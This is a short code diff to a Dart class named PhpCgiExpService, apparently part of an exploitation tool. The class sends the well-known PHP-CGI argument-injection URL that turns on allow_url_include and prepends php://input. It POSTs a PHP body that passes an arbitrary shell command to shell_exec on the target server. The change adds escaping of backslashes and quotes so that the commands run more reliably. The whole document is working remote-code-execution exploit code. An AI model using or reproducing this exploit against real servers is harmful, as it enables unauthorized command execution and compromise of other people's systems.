@@ -82,11 +82,14 @@ class PhpCgiExpService {
     try {
       final url =
           '$_base$phpPath?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input';
+      // Escape backslashes and double quotes so they survive inside the PHP
+      // double-quoted string literal.
+      final escaped = cmd.replaceAll(r'\', r'\\').replaceAll('"', r'\"');
       final res = await http
           .post(
             Uri.parse(url),
             headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-            body: '<?php echo shell_exec("$cmd"); ?>',
+            body: '<?php echo shell_exec("$escaped"); ?>',
           )
           .timeout(timeout);
       return res.body.isNotEmpty ? res.body : null;
